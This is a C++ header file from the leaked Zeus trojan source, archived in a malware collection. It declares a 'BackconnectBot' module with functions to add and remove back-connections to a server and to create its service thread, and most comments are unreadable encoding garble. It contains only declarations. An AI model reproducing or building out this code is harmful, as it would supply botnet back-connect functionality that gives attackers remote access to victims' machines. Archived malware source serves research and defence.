/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ ����������.
*/
#pragma once

#if(BO_BCSERVER_PLATFORMS > 0)

#include "..\common\threadsgroup.h"

namespace BackconnectBot
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ���������� ����������� �����������.

    IN servicePort - ���� ��� �������� �������.
    IN server      - ������.
    IN serverPort  - ���� �������.

    Return         - true - � ������ ������,
                     false - � ������ ������.
  */
  bool _addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);
  
  /*
    �������� ����������� �����������.

    IN servicePort - ���� ��� �������� �������. ����� ��������� ����� '*' ��� '?'.
    IN server      - ������. ����� ��������� ����� '*' ��� '?'.
    IN serverPort  - ���� �������. ����� ��������� ����� '*' ��� '?'.

    Return         - true - � ������ ������,
                     false - � ������ ������.
  */
  bool _removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);

  /*    Thread creation.

    IN OUT group - the group potokok to which will belong to the flow of service.
    
    Return - true - if successful,
                   false - if an error occurs.
  */
  bool _create(ThreadsGroup::GROUP *group);
};
#endif
